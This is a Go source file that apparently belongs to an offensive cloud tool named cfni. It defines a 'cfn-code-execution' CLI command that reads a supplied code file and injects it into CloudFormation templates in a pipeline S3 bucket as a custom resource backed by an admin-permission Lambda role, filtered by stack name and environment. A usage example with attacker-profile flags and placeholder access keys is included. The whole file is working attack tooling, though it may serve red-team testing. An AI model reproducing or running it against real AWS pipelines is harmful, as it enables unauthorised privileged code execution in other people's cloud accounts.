package cmd

import (
	"os"

	"github.com/hupe1980/cfni/pkg/cfni"
	"github.com/spf13/cobra"
)

type cfnCodeExecutionOptions struct {
	attackOptions
	filename        string
	runtime         string
	logicalRoleID   string
	logicalLambdaID string
	logicalCustomID string
	customType      string
}

func newCFNCodeExecutionCmd(globalOpts *globalOptions) *cobra.Command {
	opts := &cfnCodeExecutionOptions{}
	cmd := &cobra.Command{
		Use:   "cfn-code-execution",
		Short: "Adds a custom resource with admin permission to run custom code",
		Example: `cat > input.js << EOF
async function cfni(event, context) {
	console.log(event)
	return {}
}
EOF

cfni cfn-code-execution --attacker-profile ap --bucket-profile bp --bucket pipeline-bucket --s3-access-key-id AKIAXXX --s3-secret-access-key Ey123XXX -f input.js --runtime nodejs16.x`,
		SilenceUsage:  true,
		SilenceErrors: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			code, err := os.ReadFile(opts.filename)
			if err != nil {
				return err
			}

			c, err := newCFNI(globalOpts)
			if err != nil {
				return err
			}

			s3AccessKey := &cfni.S3AccessKey{
				AccessKeyID:     opts.accessKeyID,
				SecretAccessKey: opts.secretAccessKey,
				SessionToken:    opts.sessionToken,
			}

			handler, err := c.CreateCFNCodeExecutionHandler(&cfni.CreateCFNCodeExecutionOptions{
				S3AccessKey:     s3AccessKey,
				Runtime:         opts.runtime,
				Code:            string(code),
				LogicalRoleID:   opts.logicalRoleID,
				LogicalLambdaID: opts.logicalLambdaID,
				LogicalCustomID: opts.logicalCustomID,
				CustomType:      opts.customType,
				Filter: &cfni.Filter{
					Environments: opts.environments,
					StackNames:   opts.stackNames,
				},
			})
			if err != nil {
				return err
			}

			return c.CreateInfrastructure(opts.bucket, handler, "", !s3AccessKey.IsValid())
		},
	}

	addAttackCommands(cmd, &opts.attackOptions)

	cmd.Flags().StringVarP(&opts.filename, "filename", "f", "", "filename of the code execution file")
	cmd.Flags().StringVarP(&opts.runtime, "runtime", "", "", "runtime of the code execution")
	cmd.Flags().StringVarP(&opts.logicalRoleID, "locigal-role-id", "", "CFNIRoleAF22D32D", "logical id of role")
	cmd.Flags().StringVarP(&opts.logicalLambdaID, "locigal-lambda-id", "", "CFNILambdaFB14A34E", "logical id of lambda")
	cmd.Flags().StringVarP(&opts.logicalCustomID, "locigal-custom-id", "", "CFNICustomResourceCE34F12B", "logical id of custom resource")
	cmd.Flags().StringVarP(&opts.customType, "custom-type", "", "CFNICustomResource", "custom type of custom resource")

	_ = cmd.MarkFlagRequired("filename")
	_ = cmd.MarkFlagRequired("runtime")

	return cmd
}
